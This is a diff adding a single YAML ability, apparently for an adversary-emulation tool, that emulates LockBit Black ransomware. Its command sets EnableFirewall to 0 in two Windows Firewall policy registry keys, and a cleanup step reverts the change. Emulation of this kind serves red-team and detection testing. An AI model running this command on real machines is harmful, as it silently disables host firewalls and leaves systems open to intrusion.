@@ -1,0 +1,20 @@
+---
+- id: 47c89ca1bebf31127217a582c1ef8661
+  name: LockBit Black - Unusual Windows firewall registry modification -cmd
+  description: 'An adversary tries to modify the windows firewall registry
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1686
+    name: Disable or Modify System Firewall
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"
+          /v EnableFirewall /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"
+          /v EnableFirewall /t REG_DWORD /d 0 /f
+        payloads: []
+        cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"
+          /v EnableFirewall /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"
+          /v EnableFirewall /f >nul 2>&1
